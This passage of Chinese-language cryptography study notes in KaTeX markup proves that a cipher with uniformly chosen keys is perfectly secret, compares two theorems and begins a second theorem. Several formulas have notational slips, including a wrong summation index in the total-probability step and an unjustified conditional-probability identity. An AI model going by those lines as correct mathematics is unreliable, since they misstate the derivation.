mtight">∣</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>，则该密码完善保密。</font></p><p>证明：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo stretchy="false">]</mo><mo>=</mo><msub><mo>∑</mo><mrow><mi>k</mi><mo>:</mo><mi>y</mi><mo>=</mo><msub><mi>e</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow></msub><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>k</mi><mo stretchy="false">]</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">Pr[y|x]=\sum_{k:y=e_k(x)}Pr[k]=\frac{1}{|P|}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.22471em;vertical-align:-0.47471em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.22528999999999993em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mrel mtight">:</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">=</span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3487714285714287em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15122857142857138em;"><span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">x</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.47471em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.365108em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="mord mtight">∣</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><br />由全概率公式：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mo stretchy="false">]</mo><mo>=</mo><msub><mo>∑</mo><mrow><mi>k</mi><mo>:</mo><mi>y</mi><mo>=</mo><msub><mi>e</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow></msub><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>x</mi><mo stretchy="false">]</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo stretchy="false">]</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">Pr[y]=\sum_{k:y=e_k(x)}Pr[x]Pr[y|x]=\frac{1}{|P|}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.22471em;vertical-align:-0.47471em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.22528999999999993em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mrel mtight">:</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">=</span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3487714285714287em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15122857142857138em;"><span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">x</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.47471em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mclose">]</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.365108em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="mord mtight">∣</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><p><font color=blue>深层理解：定理1与定理4的区别是：定理1的条件是充分条件，但无需满足<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi><mo>=</mo><mi mathvariant="normal">∣</mi><mi>C</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|P|=|C|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord">∣</span></span></span></span>的条件。如果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi><mo mathvariant="normal">≠</mo><mi mathvariant="normal">∣</mi><mi>C</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|P|\ne |C|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord">∣</span></span></span></span>，上述结论仍可能成立，唯一的区别是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo stretchy="false">]</mo><mo>=</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mo stretchy="false">]</mo><mo mathvariant="normal">≠</mo><mfrac><mn>1</mn><mrow><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">Pr[y|x]=Pr[y]\ne \frac{1}{|P|}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.365108em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="mord mtight">∣</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>。由密码体系定义可知，对于任何密码系统，均有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi><mo>≤</mo><mi mathvariant="normal">∣</mi><mi>C</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|P|\le|C|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord">∣</span></span></span></span>。对于给定的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>∈</mo><mi>P</mi></mrow><annotation encoding="application/x-tex">x\in P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>，由全概率公式可知：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>x</mi><mo stretchy="false">]</mo><mo>=</mo><msub><mo>∑</mo><mrow><msub><mi>y</mi><mi>i</mi></msub><mo>∈</mo><mi>C</mi></mrow></msub><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><msub><mi>y</mi><mi>i</mi></msub><mo stretchy="false">]</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>x</mi><mi mathvariant="normal">∣</mi><msub><mi>y</mi><mi>i</mi></msub><mo stretchy="false">]</mo><mo>=</mo><msub><mo>∑</mo><mrow><msub><mi>y</mi><mi>i</mi></msub><mo>∈</mo><mi>C</mi></mrow></msub><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mo stretchy="false">]</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>k</mi><mo>:</mo><msub><mi>e</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>y</mi><mi>i</mi></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">Pr[x]=\sum_{y_i\in C} Pr[y_i]Pr[x|y_i]=\sum_{y_i\in C}Pr[y]Pr[k:e_k(x)=y_i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.185818em;vertical-align:-0.43581800000000004em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.17862099999999992em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:-0.03588em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">C</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.185818em;vertical-align:-0.43581800000000004em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.17862099999999992em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:-0.03588em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">C</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">]</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>，易得此时<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><msub><mi>y</mi><mi>i</mi></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">Pr[y_i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>不可能恒为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mrow><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{|P|}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.365108em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="mord mtight">∣</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>，否则<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mo>∑</mo><mi>C</mi></msub><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><msub><mi>y</mi><mi>i</mi></msub><mo stretchy="false">]</mo><mo>&gt;</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\sum_C Pr[y_i]&gt;1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0497100000000001em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.17862099999999992em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">C</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>，这显然不可能。</font></p><hr /><p><font color=red>定理2：对于密码体制<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mi>C</mi><mo separator="true">,</mo><mi>K</mi><mo separator="true">,</mo><mi>E</mi><mo separator="true">,</mo><mi>D</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(P,C,K,E,D)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mclose">)</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span>等概率选取，若对于任意的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>∈</mo><mi>P</mi><mo 